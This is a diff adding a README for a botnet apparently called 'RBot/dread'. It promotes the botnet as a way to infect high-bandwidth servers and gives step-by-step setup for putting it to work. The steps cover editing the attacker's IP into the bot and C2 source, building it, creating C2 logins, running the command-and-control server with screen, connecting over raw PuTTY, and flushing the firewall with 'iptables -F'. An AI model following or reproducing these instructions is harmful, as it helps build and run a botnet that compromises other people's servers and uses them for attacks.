@@ -1,0 +1,25 @@
+Welcome to RBot/dread
+For some reason all the skids have moved away from scanning ssh to their qbots, and have started
+spending their parents life savings on high upload speed servers to infect to their net in order to have some power
+without any work. This botnet is made specifically for that. The only arch you can infect is i568 (Infects servers only).
+
+Have fun.
+
+Note: we have almost no use for half the shit in the bot i'll be updating this later
+
+
+SUPER ez setup:
+
+1. Edit IP in /x86/bot.c (line 40) and cnc.c change to your server IP
+
+2. chmod 777 *; ./build.sh
+
+6. Make login.txt file for c2 (use user:pass format)
+
+7. screen your c2: screen ./cnc 3074 1 1337
+
+8.Connect to the CNC using an ssh client like PuTTY
+Connection type: RAW
+Port: 1337
+
+if you cant connect to cnc after screening try (service httpd restart) and (iptables -F)
